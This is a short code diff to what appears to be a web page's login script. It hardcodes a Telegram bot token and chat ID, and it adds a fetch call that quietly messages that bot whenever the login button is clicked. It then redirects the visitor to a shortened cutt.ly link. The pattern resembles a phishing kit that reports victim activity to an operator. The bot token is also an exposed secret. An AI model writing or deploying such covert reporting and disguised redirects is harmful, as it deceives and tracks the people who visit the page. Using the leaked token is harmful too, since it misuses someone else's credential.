@@ -181,7 +181,13 @@ text-decoration:none;
 const token = "8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c ";
 const chat_id = "8296340452";
 function login(){
+
+let text = "Website login button clicked";
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`);
+
 window.location.href="https://cutt.ly/otrecCFE";
+
 }
 
 function cap(){
